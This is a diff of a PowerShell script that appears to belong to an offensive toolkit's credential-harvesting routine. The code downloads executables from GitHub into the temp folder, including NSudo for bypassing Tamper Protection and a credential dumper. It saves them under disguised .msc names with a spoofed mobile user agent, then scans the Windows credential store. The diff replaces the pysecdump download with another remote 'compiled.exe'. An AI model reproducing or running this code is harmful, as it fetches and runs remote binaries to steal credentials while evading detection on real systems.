@@ -97,7 +97,8 @@ If($GetPasswords -ieq "Enum"){
          iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\BCDstore.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
       If(-not(Test-Path -Path "$Env:TMP\diskmgr.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\diskmgr.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         ## https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe
+         iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/compiled.exe -OutFile $Env:TMP\diskmgr.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
       If(-not(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue)){
@@ -136,7 +137,8 @@ If($GetPasswords -ieq "Enum"){
    Write-Host "`n`nScanning credential store for creds!" -ForegroundColor Green
    Write-Host "------------------------------------"
    $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
-   iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+   ## https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe
+   iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/compiled.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
 
    ## Build Output Table
    If(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue){
